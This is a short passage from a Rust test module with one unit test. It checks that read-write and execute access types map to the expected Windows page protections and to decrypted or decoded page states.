    #[test]
    fn test_page_state_transitions() {
        assert_eq!(AccessType::ReadWrite.to_protect(), PAGE_READWRITE);
        assert_eq!(AccessType::Execute.to_protect(), PAGE_EXECUTE_READ);
        assert_eq!(AccessType::ReadWrite.to_state(), PageState::DecryptedRW);
        assert_eq!(AccessType::Execute.to_state(), PageState::DecodedRX);
    }
}
